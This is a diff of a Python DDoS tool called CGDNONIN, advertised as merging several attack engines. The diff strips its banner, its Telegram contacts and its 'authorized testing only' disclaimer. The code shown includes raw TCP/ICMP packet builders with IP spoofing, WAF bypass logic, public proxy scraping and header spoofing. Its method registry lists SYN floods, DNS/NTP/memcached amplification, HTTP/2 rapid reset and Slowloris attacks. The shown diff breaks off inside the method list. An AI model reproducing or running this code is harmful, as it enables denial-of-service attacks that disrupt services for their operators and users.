@@ -1,30 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-╔══════════════════════════════════════════════════════════════════════════════╗
-║                                                                              ║
-║   ██████╗ ██████╗ ██████╗ ███╗   ██╗ ██████╗ ███╗   ██╗██╗███╗   ██╗        ║
-║  ██╔════╝██╔════╝██╔══██╗████╗  ██║██╔═══██╗████╗  ██║██║████╗  ██║        ║
-║  ██║     ██║  ███╗██║  ██║██╔██╗ ██║██║   ██║██╔██╗ ██║██║██╔██╗ ██║        ║
-║  ██║     ██║   ██║██║  ██║██║╚██╗██║██║   ██║██║╚██╗██║██║██║╚██╗██║        ║
-║  ╚██████╗╚██████╔╝██████╔╝██║ ╚████║╚██████╔╝██║ ╚████║██║██║ ╚████║        ║
-║   ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝        ║
-║                                                                              ║
-║              U N I F I E D   ·   S U P R E M E   ·   E N G I N E             ║
-║                                                                              ║
-║  ddos303 v65.1 + NOVA + CyberGhost merged into one powerplant                ║
-║  180+ methods · HTTP/1+2+3 · L4 raw · AMP · Services · Games · CVE           ║
-║  Adaptive · WAF bypass · JA3/JA4 · Origin discovery · 12 themes · 6 langs    ║
-║  ETW/AMSI patch · Residential proxy · NetHealth · Controller · Web panel    ║
-║                                                                              ║
-║  Channel : https://t.me/cyber_ghost_error_404_chanel                        ║
-║  Contact : https://t.me/Cyber_Ghost_error_404                               ║
-║  Parent  : CyberGhost-OS · arsenal / engines / CGDNONIN                     ║
-║  License : MIT                                                              ║
-║                                                                              ║
-╚══════════════════════════════════════════════════════════════════════════════╝
-
-For authorized security testing only.
+================================================================================
+ CGDNONIN v4.0 SUPREME — Unified Supreme Engine
+================================================================================
 """
 from __future__ import annotations
 
@@ -57,6 +36,7 @@ import unicodedata
 import urllib.parse
 import urllib3
 import uuid
+import zlib
 from collections import Counter, OrderedDict, defaultdict
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
@@ -66,7 +46,6 @@ from pathlib import Path
 from typing import Any, Callable, Dict, List, Optional, Set, Tuple
 from urllib.parse import quote, unquote, urljoin, urlparse, urlsplit, urlunsplit
 
-# ─── Platform ──────────────────────────────────────────────────────────────
 IS_WINDOWS = sys.platform == "win32"
 IS_LINUX = sys.platform.startswith("linux")
 IS_DARWIN = sys.platform == "darwin"
@@ -107,14 +86,9 @@ def _silent_unraisable(unraisable):
 
 sys.unraisablehook = _silent_unraisable
 
-
-# ═══════════════════════════════════════════════════════════════════════════════
-#  META / PATHS
-# ═══════════════════════════════════════════════════════════════════════════════
-
 APP_NAME    = "CGDNONIN"
 APP_FULL    = "CyberGhost Donin — Unified Supreme Engine"
-APP_VERSION = "3.0.0-SUPREME"
+APP_VERSION = "4.0.0-SUPREME"
 APP_BUILD   = "2026.05"
 APP_AUTHOR  = "Cyber Ghost"
 APP_TEAM    = "CyberGhost-OS"
@@ -144,17 +118,15 @@ for _n in ("aiohttp", "asyncio", "h2", "aioquic", "websockets",
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  THEMES — 12
+#  THEMES
 # ═══════════════════════════════════════════════════════════════════════════════
-
 class BaseTheme:
     name = "base"
-    RESET="\033[0m"; BOLD="\033[1m"; DIM="\033[2m"; ITALIC="\033[3m"; UNDER="\033[4m"
+    RESET="\033[0m"; BOLD="\033[1m"; DIM="\033[2m"
     RED="\033[91m"; GREEN="\033[92m"; YELLOW="\033[93m"; BLUE="\033[94m"
     MAGENTA="\033[95m"; CYAN="\033[96m"; WHITE="\033[97m"; GRAY="\033[90m"
     ORANGE="\033[38;5;208m"; PINK="\033[38;5;213m"
-    BG_RED="\033[41m"; BG_GREEN="\033[42m"; BG_YELLOW="\033[43m"
-    BG_BLUE="\033[44m"; BG_MAGENTA="\033[45m"; BG_CYAN="\033[46m"; BG_BLACK="\033[40m"
+    BG_RED="\033[41m"; BG_GREEN="\033[42m"
     PRIMARY=CYAN; ACCENT=MAGENTA; SUCCESS=GREEN; ERROR=RED; WARN=YELLOW; INFO=BLUE
 
 
@@ -171,24 +143,15 @@ THEMES = {
                        PRIMARY="\033[38;5;46m", ACCENT="\033[38;5;40m"),
     "dracula":    _mk("Dracula", CYAN="\033[38;5;117m", MAGENTA="\033[38;5;212m",
                        PRIMARY="\033[38;5;141m", ACCENT="\033[38;5;212m"),
-    "tokyonight": _mk("TokyoNight", CYAN="\033[38;5;117m", MAGENTA="\033[38;5;183m",
-                       PRIMARY="\033[38;5;111m", ACCENT="\033[38;5;183m"),
-    "gruvbox":    _mk("Gruvbox", CYAN="\033[38;5;109m", MAGENTA="\033[38;5;132m",
-                       PRIMARY="\033[38;5;178m", ACCENT="\033[38;5;132m"),
-    "synthsplit": _mk("SynthSplit", CYAN="\033[38;5;51m", MAGENTA="\033[38;5;201m",
-                       PRIMARY="\033[38;5;201m", ACCENT="\033[38;5;51m"),
-    "nord":       _mk("Nord", CYAN="\033[38;5;109m", MAGENTA="\033[38;5;139m",
-                       PRIMARY="\033[38;5;110m", ACCENT="\033[38;5;139m"),
-    "monokai":    _mk("Monokai", CYAN="\033[38;5;81m", MAGENTA="\033[38;5;197m",
-                       PRIMARY="\033[38;5;197m", ACCENT="\033[38;5;81m"),
-    "onedark":    _mk("OneDark", CYAN="\033[38;5;80m", MAGENTA="\033[38;5;176m",
-                       PRIMARY="\033[38;5;110m", ACCENT="\033[38;5;176m"),
-    "catppuccin": _mk("Catppuccin", CYAN="\033[38;5;117m", MAGENTA="\033[38;5;218m",
-                       PRIMARY="\033[38;5;218m", ACCENT="\033[38;5;117m"),
-    "blood":      _mk("Blood", CYAN="\033[38;5;196m", MAGENTA="\033[38;5;88m",
-                       PRIMARY="\033[38;5;196m", ACCENT="\033[38;5;88m"),
-    "ice":        _mk("Ice", CYAN="\033[38;5;195m", MAGENTA="\033[38;5;153m",
-                       PRIMARY="\033[38;5;195m", ACCENT="\033[38;5;153m"),
+    "tokyonight": _mk("TokyoNight", PRIMARY="\033[38;5;111m", ACCENT="\033[38;5;183m"),
+    "gruvbox":    _mk("Gruvbox", PRIMARY="\033[38;5;178m", ACCENT="\033[38;5;132m"),
+    "nord":       _mk("Nord", PRIMARY="\033[38;5;110m", ACCENT="\033[38;5;139m"),
+    "monokai":    _mk("Monokai", PRIMARY="\033[38;5;197m", ACCENT="\033[38;5;81m"),
+    "onedark":    _mk("OneDark", PRIMARY="\033[38;5;110m", ACCENT="\033[38;5;176m"),
+    "catppuccin": _mk("Catppuccin", PRIMARY="\033[38;5;218m", ACCENT="\033[38;5;117m"),
+    "blood":      _mk("Blood", PRIMARY="\033[38;5;196m", ACCENT="\033[38;5;88m"),
+    "ice":        _mk("Ice", PRIMARY="\033[38;5;195m", ACCENT="\033[38;5;153m"),
+    "hacker":     _mk("Hacker", PRIMARY="\033[38;5;82m", ACCENT="\033[38;5;46m"),
 }
 
 C = THEMES["cyberghost"]
@@ -211,44 +174,43 @@ def term_w() -> int:
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  I18N — 6 languages
+#  I18N
 # ═══════════════════════════════════════════════════════════════════════════════
-
 LANGS = {
     "fa": {"title":"نوا","attack":"حمله","target":"هدف","method":"روش",
            "duration":"مدت","concurrency":"همزمانی","proxy":"پروکسی",
            "theme":"تم","lang":"زبان","about":"درباره","exit":"خروج",
-           "select":"انتخاب","goodbye":"خدانگهدار baby","sent":"ارسال",
+           "select":"انتخاب","goodbye":"خدانگهدار","sent":"ارسال",
            "failed":"ناموفق","running":"در حال اجرا","stopped":"متوقف",
            "cpu":"CPU","ram":"RAM","health":"سلامت"},
     "en": {"title":"Nova","attack":"Attack","target":"Target","method":"Method",
            "duration":"Duration","concurrency":"Concurrency","proxy":"Proxy",
            "theme":"Theme","lang":"Language","about":"About","exit":"Exit",
-           "select":"Select","goodbye":"Goodbye baby","sent":"Sent",
+           "select":"Select","goodbye":"Goodbye","sent":"Sent",
            "failed":"Failed","running":"Running","stopped":"Stopped",
            "cpu":"CPU","ram":"RAM","health":"Health"},
     "ru": {"title":"Nova","attack":"Атака","target":"Цель","method":"Метод",
            "duration":"Длительность","concurrency":"Параллельность","proxy":"Прокси",
            "theme":"Тема","lang":"Язык","about":"О программе","exit":"Выход",
-           "select":"Выбор","goodbye":"Пока baby","sent":"Отправлено",
+           "select":"Выбор","goodbye":"Пока","sent":"Отправлено",
            "failed":"Ошибки","running":"Работает","stopped":"Остановлено",
            "cpu":"CPU","ram":"RAM","health":"Здоровье"},
     "ar": {"title":"Nova","attack":"هجوم","target":"هدف","method":"طريقة",
            "duration":"مدة","concurrency":"تزامن","proxy":"بروكسي",
            "theme":"ثيم","lang":"لغة","about":"حول","exit":"خروج",
-           "select":"اختر","goodbye":"وداعا baby","sent":"مرسل",
+           "select":"اختر","goodbye":"وداعا","sent":"مرسل",
            "failed":"فشل","running":"قيد التشغيل","stopped":"متوقف",
            "cpu":"CPU","ram":"RAM","health":"صحة"},
     "tr": {"title":"Nova","attack":"Saldırı","target":"Hedef","method":"Yöntem",
            "duration":"Süre","concurrency":"Eşzamanlılık","proxy":"Proxy",
            "theme":"Tema","lang":"Dil","about":"Hakkında","exit":"Çıkış",
-           "select":"Seç","goodbye":"Güle güle baby","sent":"Gönderilen",
+           "select":"Seç","goodbye":"Güle güle","sent":"Gönderilen",
            "failed":"Başarısız","running":"Çalışıyor","stopped":"Durduruldu",
            "cpu":"CPU","ram":"RAM","health":"Sağlık"},
     "zh": {"title":"Nova","attack":"攻击","target":"目标","method":"方法",
            "duration":"时长","concurrency":"并发","proxy":"代理",
            "theme":"主题","lang":"语言","about":"关于","exit":"退出",
-           "select":"选择","goodbye":"再见 baby","sent":"发送",
+           "select":"选择","goodbye":"再见","sent":"发送",
            "failed":"失败","running":"运行中","stopped":"已停止",
            "cpu":"CPU","ram":"RAM","health":"健康"},
 }
@@ -267,9 +229,8 @@ def t(key: str) -> str:
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  VALIDATION (FIX: ? allowed in URL — only control chars + space banned)
+#  VALIDATION
 # ═══════════════════════════════════════════════════════════════════════════════
-
 MAX_HOST_LEN     = 255
 MAX_URL_LEN      = 2048
 MAX_METHOD_LEN   = 32
@@ -284,7 +245,6 @@ _FORBIDDEN_HOST = frozenset(
     "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x7f"
     ";|&$`<>(){}[]*?!~#\\\"'\n\r\t "
 )
-
 _METHOD_RE = re.compile(r"^[A-Z][A-Z0-9_-]{0,31}$")
 _HOSTNAME_RE = re.compile(
     r"^(?=.{1,253}$)(?!-)[A-Za-z0-9-]{1,63}(?<!-)"
@@ -353,8 +313,12 @@ def validate_url(url: str, allow_schemes=("http", "https")) -> str:
     port = parts.port
     if port is not None:
         port = validate_port(port)
-    netloc = f"[{host}]:{port}" if (port is not None and ":" in host) else \
-             f"{host}:{port}" if port is not None else host
+    if ":" in host and port is not None:
+        netloc = f"[{host}]:{port}"
+    elif port is not None:
+        netloc = f"{host}:{port}"
+    else:
+        netloc = host
     return urlunsplit((scheme, netloc, parts.path or "", parts.query, ""))
 
 
@@ -386,9 +350,8 @@ def validate_username(name: str) -> str:
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  OPTIONAL DEPENDENCY LOADER
+#  DEP LOADER
 # ═══════════════════════════════════════════════════════════════════════════════
-
 def _has_module(name: str) -> bool:
     try:
         return importlib.util.find_spec(name) is not None
@@ -539,9 +502,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  ADMIN / PRIVILEGES
+#  ADMIN
 # ═══════════════════════════════════════════════════════════════════════════════
-
 def is_admin() -> bool:
     try:
         if IS_WINDOWS:
@@ -580,9 +542,8 @@ HAS_RAW = can_raw_socket()
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  EVENT LOOP POLICY
+#  LOOP
 # ═══════════════════════════════════════════════════════════════════════════════
-
 _LOOP_BACKEND = "Default (asyncio)"
 if IS_WINDOWS:
     if HAS_PLAYWRIGHT:
@@ -604,9 +565,8 @@ else:
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  SAFE INPUT (single lock across all threads)
+#  INPUT LOCK
 # ═══════════════════════════════════════════════════════════════════════════════
-
 INPUT_LOCK = threading.Lock()
 
 
@@ -619,9 +579,8 @@ def safe_input(prompt: str = "") -> str:
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  RANDOM HELPERS
+#  RANDOM
 # ═══════════════════════════════════════════════════════════════════════════════
-
 class XorShift128:
     __slots__ = ("x", "y", "z", "w")
     def __init__(self, seed=None):
@@ -675,7 +634,6 @@ def rand_port() -> int:
 # ═══════════════════════════════════════════════════════════════════════════════
 #  PACKET BUILDERS
 # ═══════════════════════════════════════════════════════════════════════════════
-
 def _checksum(data: bytes) -> int:
     if len(data) % 2:
         data += b"\x00"
@@ -705,8 +663,7 @@ def tcp_packet(src: str, dst: str, sp: int, dp: int, seq: int, ack: int,
     h = struct.pack("!HHLLBBHHH", sp, dp, seq, ack, doff << 4, flags,
                     65535, 0, 0) + opts
     pseudo = (socket.inet_aton(src) + socket.inet_aton(dst) +
-              struct.pack("!BBH", 0, socket.IPPROTO_TCP,
-                          len(h) + len(payload)))
+              struct.pack("!BBH", 0, socket.IPPROTO_TCP, len(h) + len(payload)))
     ck = _checksum(pseudo + h + payload)
     h = (struct.pack("!HHLLBBH", sp, dp, seq, ack, doff << 4, flags, 65535) +
          struct.pack("!H", ck) + struct.pack("!H", 0) + opts)
@@ -735,13 +692,14 @@ def icmp_packet(src: str, dst: str, payload: bytes, typ: int = 8,
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  RAW SOCKET POOL (per-thread + zerocopy + sndbuf)
+#  RAW SOCKET POOL
 # ═══════════════════════════════════════════════════════════════════════════════
-
 class RawSocketPool:
     def __init__(self, proto: int, hdrincl: bool = True,
                  sndbuf: int = 64 * 1024 * 1024):
-        self.proto = proto; self.hdrincl = hdrincl; self.sndbuf = sndbuf
+        self.proto = proto
+        self.hdrincl = hdrincl
+        self.sndbuf = sndbuf
         self._local = threading.local()
 
     def _make(self):
@@ -785,9 +743,8 @@ raw_ip   = RawSocketPool(socket.IPPROTO_RAW, hdrincl=True)
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  SENDMMSG — Linux batch syscall (via ctypes)
+#  SENDMMSG
 # ═══════════════════════════════════════════════════════════════════════════════
-
 _libc = None
 if not IS_WINDOWS:
     for _n in ("libc.so.6", "libc.so", "libSystem.B.dylib"):
@@ -807,7 +764,6 @@ if IS_LINUX and _libc is not None:
 # ═══════════════════════════════════════════════════════════════════════════════
 #  IDENTITY DATA
 # ═══════════════════════════════════════════════════════════════════════════════
-
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
@@ -850,32 +806,6 @@ CURL_IMPERSONATE = [
     "edge101", "edge99",
 ]
 
-GOOGLEBOT_AGENTS = [
-    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-    "Googlebot/2.1 (+http://www.google.com/bot.html)",
-    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
-    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
-]
-
-REFERER_PREFIXES = [
-    "https://www.facebook.com/l.php?u=", "https://www.google.com/translate?u=",
-    "https://www.bing.com/search?q=", "https://duckduckgo.com/?q=",
-    "https://search.yahoo.com/search?p=", "https://www.reddit.com/submit?url=",
-    "https://twitter.com/intent/tweet?url=", "https://t.me/share/url?url=",
-    "https://wa.me/?text=", "https://www.linkedin.com/sharing/share-offsite/?url=",
-    "https://www.pinterest.com/pin/create/button/?url=",
-    "https://www.tumblr.com/widgets/share/tool?canonicalUrl=",
-]
-
-COMMON_SUBDOMAINS = [
-    "mail", "dev", "staging", "origin", "cpanel", "webmail", "direct",
-    "backend", "api", "admin", "portal", "test", "stage", "prod",
-    "server", "host", "vpn", "ftp", "sftp", "ssh", "db", "database",
-    "app", "mobile", "m", "www2", "web", "ns1", "ns2", "dns", "mx",
-    "cdn", "static", "assets", "media", "img", "images", "files",
-    "blog", "shop", "store", "secure", "login", "auth", "sso",
-]
-
 CHROME_HEADER_ORDER = [
     "Host", "Connection", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
     "Upgrade-Insecure-Requests", "User-Agent", "Accept", "Sec-Fetch-Site",
@@ -883,14 +813,10 @@ CHROME_HEADER_ORDER = [
     "Accept-Language", "Cookie",
 ]
 
-CHROME_133_SETTINGS = "1:65536;2:0;3:1000;4:6291456;5:16384;6:262144"
-CHROME_133_WINDOW_UPDATE = 15663105
-
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  FAST UA GENERATOR
+#  UA GENERATOR
 # ═══════════════════════════════════════════════════════════════════════════════
-
 class FastUAGenerator:
     CHROME_VERSIONS = list(range(99, 147))
     CHROME_BUILDS = {str(v): f"{random.randint(4000, 7999)}.0" for v in CHROME_VERSIONS}
@@ -904,9 +830,6 @@ class FastUAGenerator:
     SAFARI_VERSIONS = list(range(15, 27))
     EDGE_VERSIONS = list(range(99, 132))
 
-    def __init__(self):
-        self._lock = threading.Lock()
-
     def _pick(self, lst): return random.choice(lst)
 
     def chrome_desktop(self):
@@ -918,12 +841,13 @@ class FastUAGenerator:
     def chrome_mobile(self):
         v = self._pick(self.CHROME_VERSIONS)
         b = self.CHROME_BUILDS.get(str(v), "5000.0")
-        p = f"Linux; Android {random.randint(10, 15)}; {random.choice(['Pixel 8','SM-S928B','SM-A536E','Pixel 7'])}"
+        p = f"Linux; Android {random.randint(10, 15)}; {random.choice(['Pixel 8','SM-S928B','SM-A536E'])}"
         return f"Mozilla/5.0 ({p}) AppleWebKit/{self.CHROME_WEBKIT} (KHTML, like Gecko) Chrome/{v}.0.{b}.0 Mobile Safari/{self.CHROME_WEBKIT}"
 
     def firefox_desktop(self):
         v = self._pick(self.FIREFOX_VERSIONS)
-        p = self._pick(["Windows NT 10.0; Win64; x64", "X11; Linux x86_64", "Macintosh; Intel Mac OS X 10.15"])
+        p = self._pick(["Windows NT 10.0; Win64; x64", "X11; Linux x86_64",
+                         "Macintosh; Intel Mac OS X 10.15"])
         return f"Mozilla/5.0 ({p}; rv:{v}.0) Gecko/20100101 Firefox/{v}.0"
 
     def safari_desktop(self):
@@ -970,10 +894,6 @@ class FastUAGenerator:
         return {}
 
 
-# ═══════════════════════════════════════════════════════════════════════════════
-#  PER-REQUEST IDENTITY
-# ═══════════════════════════════════════════════════════════════════════════════
-
 class PerRequestIdentity:
     def __init__(self, ua_gen: Optional[FastUAGenerator] = None):
         self.ua_gen = ua_gen or FastUAGenerator()
@@ -1001,8 +921,7 @@ class PerRequestIdentity:
         h["Accept-Language"] = random.choice(ACCEPT_LANGS)
         cookie = "; ".join(
             f"{random.choice(COOKIE_NAMES)}={secrets.token_hex(8)}"
-            for _ in range(random.randint(1, 3))
-        )
+            for _ in range(random.randint(1, 3)))
         h["Cookie"] = cookie
         fake_ip = rand_ip()
         h["X-Forwarded-For"] = fake_ip
@@ -1017,7 +936,6 @@ class PerRequestIdentity:
 # ═══════════════════════════════════════════════════════════════════════════════
 #  STATS
 # ═══════════════════════════════════════════════════════════════════════════════
-
 class ShardedStats:
     def __init__(self, slots: int = 512):
         self.n = slots
@@ -1063,9 +981,8 @@ class ShardedStats:
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  RESOURCE GATE (fixed interval 0.2s)
+#  RESOURCE GATE
 # ═══════════════════════════════════════════════════════════════════════════════
-
 class ResourceGate:
     def __init__(self):
         self.scale = 1.0
@@ -1083,8 +1000,7 @@ class ResourceGate:
         if not HAS_PSUTIL or (self._th and self._th.is_alive()):
             return
         self._stop = False
-        self._th = threading.Thread(target=self._loop, daemon=True,
-                                     name="resgate")
+        self._th = threading.Thread(target=self._loop, daemon=True, name="resgate")
         self._th.start()
 
     def stop(self):
@@ -1157,7 +1073,6 @@ resource_gate = ResourceGate()
 # ═══════════════════════════════════════════════════════════════════════════════
 #  RATE LIMITERS
 # ═══════════════════════════════════════════════════════════════════════════════
-
 class FixedRateLimiter:
     def __init__(self, rate_pps: int = 0):
         self.rate = max(0, rate_pps)
@@ -1246,7 +1161,6 @@ class AdaptiveRateLimiter:
 # ═══════════════════════════════════════════════════════════════════════════════
 #  WAF DETECTION
 # ═══════════════════════════════════════════════════════════════════════════════
-
 WAF_SIGS = {
     "Cloudflare": ["cf-ray", "cloudflare", "__cfduid", "cf-cache-status"],
     "Akamai":     ["akamai", "akamai-grn", "ak-bmsc"],
@@ -1298,17 +1212,12 @@ class WAFDetector:
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  WAF BYPASS ENGINE
+#  WAF BYPASS
 # ═══════════════════════════════════════════════════════════════════════════════
-
 class WAFBypassEngine:
     TLS_PROFILES = CURL_IMPERSONATE
     METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD",
                "OPTIONS", "TRACE", "CONNECT", "FOO", "BAR"]
-    OVERRIDE_HEADERS = [
-        "X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override",
-        "X-Original-Method", "X-Forwarded-Method",
-    ]
 
     @staticmethod
     def align_headers(ua: str, sec_ch: Dict[str, str],
@@ -1353,37 +1262,24 @@ class WAFBypassEngine:
         return random.choices(
             WAFBypassEngine.METHODS,
             weights=[0.30, 0.15, 0.08, 0.05, 0.05, 0.08, 0.05, 0.03, 0.03, 0.05, 0.05],
-            k=1,
-        )[0]
+            k=1)[0]
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  PROXY MANAGER
+#  PROXY
 # ═══════════════════════════════════════════════════════════════════════════════
-
 PROXY_SOURCES = [
     "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
     "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
     "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
     "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
-    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
-    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
     "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies.txt",
     "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
-    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
-    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
-    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
     "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/all.txt",
     "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/http.txt",
-    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks4.txt",
-    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks5.txt",
-    "https://www.proxy-list.download/api/v1/get?type=http",
-    "https://www.proxy-list.download/api/v1/get?type=socks4",
-    "https://www.proxy-list.download/api/v1/get?type=socks5",
-    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
     "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
-    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks4.txt",
-    "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt",
+    "https://www.proxy-list.download/api/v1/get?type=http",
+    "https://www.proxy-list.download/api/v1/get?type=socks5",
 ]
 
 RESIDENTIAL_PROVIDERS = {
@@ -1412,8 +1308,7 @@ def _parse_proxy(line: str) -> Optional[Dict[str, Any]]:
         return None
     scheme_map = {"http": "http", "https": "http", "socks5": "socks5",
                   "socks4": "socks4", "socks4a": "socks4", "socks": "socks5"}
-    return {"ip": ip, "port": int(port_s),
-            "type": scheme_map.get(scheme, "http")}
+    return {"ip": ip, "port": int(port_s), "type": scheme_map.get(scheme, "http")}
 
 
 def _fetch_proxies() -> List[Dict[str, Any]]:
@@ -1538,7 +1433,6 @@ proxy_mgr = ProxyManager()
 # ═══════════════════════════════════════════════════════════════════════════════
 #  CONFIG
 # ═══════════════════════════════════════════════════════════════════════════════
-
 CONFIG_FILE = HOME_DIR / "config.json"
 
 
@@ -1589,25 +1483,20 @@ set_lang(cfg.lang)
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
-#  METHOD REGISTRY
+#  METHODS
 # ═══════════════════════════════════════════════════════════════════════════════
-
 METHODS: List[Tuple[str, str]] = [
     ("INFINITY_MIX", "🌌"),
-    # L4 TCP
     ("SYN_FLOOD", "🔥"), ("ACK_FLOOD", "📨"), ("RST_FLOOD", "🛑"),
     ("FIN_FLOOD", "🏁"), ("XMAS_FLOOD", "🎄"), ("NULL_FLOOD", "⬛"),
     ("PSH_FLOOD", "📤"), ("URG_FLOOD", "🚨"), ("SYN_ACK_FLOOD", "🤝"),
     ("IPSPOOF_SYN", "🎭"), ("TCP_TS_SPOOF", "⏰"),
-    ("TCP_SACK_ABUSE", "🎁"), ("TCP_FASTOPEN", "🚀"),
-    ("LAND_ATTACK", "🏠"), ("TCP_AMP", "⚡"), ("SCTP_INIT", "📡"),
-    # L4 UDP/ICMP
+    ("LAND_ATTACK", "🏠"), ("TCP_AMP", "⚡"),
     ("UDP_FLOOD", "💀"), ("ICMP_FLOOD", "⚡"), ("ICMP_FRAG", "🧩"),
     ("JUMBO_FRAME", "🐘"), ("FRAG_FLOOD", "🧩"),
     ("GRE_FLOOD", "🔀"), ("ESP_FLOOD", "🔐"), ("IPIP_FLOOD", "🎁"),
     ("IP_OPTIONS_FLOOD", "🧬"), ("MAC_SPOOF", "🔗"),
     ("SMURF_ATTACK", "💥"), ("IPV6_RAW", "6️⃣"), ("PQC_QUIC", "🔮"),
-    # AMP
     ("DNS_AMP", "📡"), ("DNS_QUERY", "❓"), ("DNS_EDNS0", "📡"),
     ("NTP_MONLIST", "🕐"), ("MEMCACHED", "💾"), ("SSDP", "🔌"),
     ("CLDAP", "📂"), ("LDAP_AMP", "🔍"), ("SNMP", "📊"),
@@ -1619,7 +1508,6 @@ METHODS: List[Tuple[str, str]] = [
     ("QUAKE3", "🎯"), ("STEAM_A2S", "🎮"), ("RDP_UDP", "🖥️"),
     ("BACNET", "🏢"), ("IPMI", "🔌"), ("OPENVPN", "🔐"),
     ("IKE", "🔑"), ("PPTP", "📞"), ("L2TP", "🔗"), ("ZIGBEE", "📡"),
-    # HTTP/1.1
     ("HTTP_FLOOD", "🌊"), ("HTTP_GET", "📥"), ("HTTP_POST", "📤"),
     ("HTTP_HEAD", "📄"), ("HTTP_PIPELINE", "📶"),
     ("CFB", "☁️"), ("CFBUAM", "☁️"), ("BYPASS", "🚪"),
@@ -1635,10 +1523,8 @@ METHODS: List[Tuple[str, str]] = [
     ("GRAPHQL_DEPTH", "📊"), ("GRAPHQL_ALIAS", "🎭"),
     ("SMUGGLE_CLTE", "🕵️"), ("SMUGGLE_TECL", "🕵️"),
     ("HOST_HEADER_INJECT", "🎯"), ("OPERATOR_FATIGUE", "😵"),
-    # Slow
     ("SLOWLORIS", "🐌"), ("SLOW_READ", "📖"), ("RUDY", "💧"),
     ("SLOW_HEADERS", "🐌"), ("SLOW_BODY", "🐛"),
-    # HTTP/2
     ("HTTP2_RAPID_RESET", "⚡"), ("HTTP2_PING", "🏓"),
     ("HTTP2_SETTINGS", "⚙️"), ("HTTP2_WINDOW_UPDATE", "🪟"),
     ("HTTP2_HPACK_BOMB", "💣"), ("HTTP2_MULTIPLEX", "🔀"),
@@ -1646,19 +1532,15 @@ METHODS: List[Tuple[str, str]] = [
     ("HTTP2_MADE_YOU_RESET", "🔁"), ("HTTP2_SMUGGLING", "🕵️"),
     ("HTTP2_GRPC_CHURN", "⚙️"), ("HTTP2_PRIORITY", "🎯"),
     ("HTTP2_CONTINUATION", "🌊"),
-    # HTTP/3
     ("HTTP3_QUIC_FLOOD", "🚀"), ("HTTP3_QPACK_BOMB", "💣"),
     ("HTTP3_RETRY_LOOP", "🔄"), ("HTTP3_0RTT", "0️⃣"),
     ("HTTP3_CLOSE_FLOOD", "🔚"), ("HTTP3_STREAM_RESET", "🔄"),
     ("QUIC_LEAK", "💧"),
-    # TLS
     ("TLS_CLIENT_HELLO", "👋"), ("TLS_JA3_RANDOM", "🎭"),
     ("TLS_JA4_RANDOM", "🎭"), ("SNI_FLOOD", "🎭"),
     ("SNI_SPOOF", "🕵️"), ("TLS_ECH_FLOOD", "🕶️"),
     ("TLS_RENEGOTIATION", "🔁"), ("TLS_HEARTBLEED", "💔"),
-    # WebSocket
     ("WEBSOCKET_FLOOD", "🔌"), ("WEBSOCKET_ZIP", "🗜️"),
-    # Services
     ("REDIS_FLOOD", "🔴"), ("MONGO_FLOOD", "🍃"), ("ELASTIC_BOMB", "🔍"),
     ("MQTT_FLOOD", "📬"), ("AMQP_FLOOD", "🐰"), ("RDP_FLOOD", "🖥️"),
     ("VNC_FLOOD", "🖼️"), ("SMB_FLOOD", "🗂️"), ("SMTP_FLOOD", "✉️"),
@@ -1666,12 +1548,10 @@ METHODS: List[Tuple[str, str]] = [
